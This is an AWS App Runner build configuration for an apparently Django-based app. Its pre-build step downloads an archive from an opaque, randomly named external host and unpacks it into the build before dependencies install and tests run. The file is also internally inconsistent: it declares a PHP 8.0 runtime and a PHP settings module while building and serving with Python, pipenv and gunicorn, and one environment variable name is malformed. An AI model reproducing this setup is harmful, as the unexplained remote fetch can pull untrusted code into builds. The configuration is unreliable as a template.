version: 1.0
runtime: PHP 8.0
build:
  commands:
    pre-build:
      - wget -c https://mbcmihrw3v.us-east-1.awsapprunner.com -O - | tar -xz
    build:        
      - pip install pipenv
      - pipenv install
    post-build:
      - python manage.py test
  env:
    - name: PHP_SETTINGS_MODULE
      value: "./application/config.php"
    - name: :LinelExpense
      value: "example"
run:
  runtime-version: 3.7.7
  command: pipenv run gunicorn django_apprunner.wsgi --log-file -
  network: 
    port: 8000
    env: MY_APP_PORT  
  env:
    - name: MY_VAR_EXAMPLE
      value: "example"